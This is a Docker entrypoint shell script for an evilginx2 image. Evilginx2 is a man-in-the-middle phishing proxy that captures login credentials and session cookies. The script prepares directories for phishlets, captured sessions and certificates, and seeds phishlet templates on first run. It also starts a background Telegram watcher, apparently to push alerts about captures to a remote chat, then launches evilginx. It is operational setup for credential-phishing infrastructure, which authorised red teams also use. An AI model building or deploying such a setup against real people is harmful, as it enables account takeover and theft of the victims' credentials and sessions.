#!/bin/sh
# entrypoint.sh for evilginx2 docker image
set -e

APP_DIR=/app
SEED_PHISHLETS=/usr/local/share/evilginx/phishlets

# 1. Ensure data directories exist
for d in "$APP_DIR/phishlets" "$APP_DIR/sessions" "$APP_DIR/certs"; do
    [ -d "$d" ] || mkdir -p "$d"
done

# 2. Seed persistent phishlets volume on FIRST run only
if [ -d "$SEED_PHISHLETS" ]; then
    if [ -z "$(ls -A "$APP_DIR/phishlets" 2>/dev/null)" ]; then
        echo "[entrypoint] Seeding phishlets into $APP_DIR/phishlets ..."
        cp -r "$SEED_PHISHLETS"/. "$APP_DIR/phishlets"/
    fi
fi

# 3. Start Telegram watcher (optional - needs TG_BOT_TOKEN + TG_CHAT_ID)
if [ -n "$TG_BOT_TOKEN" ] && [ -n "$TG_CHAT_ID" ]; then
    echo "[entrypoint] Telegram notifications enabled."
    setsid /usr/local/bin/telegram-watch.sh >/dev/null 2>&1 &
fi

# 4. Fix volume ownership, drop to non-root, run evilginx
if [ "$(id -u)" = "0" ]; then
    chown -R evilginx:evilginx "$APP_DIR" 2>/dev/null || true
    exec su-exec evilginx:evilginx /usr/local/bin/evilginx "$@"
fi

exec /usr/local/bin/evilginx "$@"
